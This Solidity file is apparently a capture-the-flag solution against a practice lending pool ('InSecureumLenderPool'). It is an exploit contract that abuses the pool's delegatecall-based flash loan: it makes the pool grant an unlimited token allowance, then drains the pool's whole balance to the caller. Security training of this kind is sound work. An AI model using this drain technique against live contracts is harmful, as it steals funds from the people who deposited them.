// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Challenge1.lenderpool.sol";

contract Attack {
    IERC20 public token;
    InSecureumLenderPool public pool;

    constructor(InSecureumLenderPool _pool) {
        pool = InSecureumLenderPool(_pool);
    }
    
    function steal() external {
        pool.flashLoan(address(this), abi.encode(Attack.approval.selector));

        IERC20 _token = pool.token();

        uint256 bal = _token.balanceOf(address(pool));

        _token.transferFrom(address(pool), msg.sender, bal);
    }

    // Because the pool does a delegatecall to conduct the flashloan. All we need to do is use 
    // do a callback with an approve and finish by removing the money.
    function approval() external {
        token.approve(msg.sender, type(uint256).max);
    }
}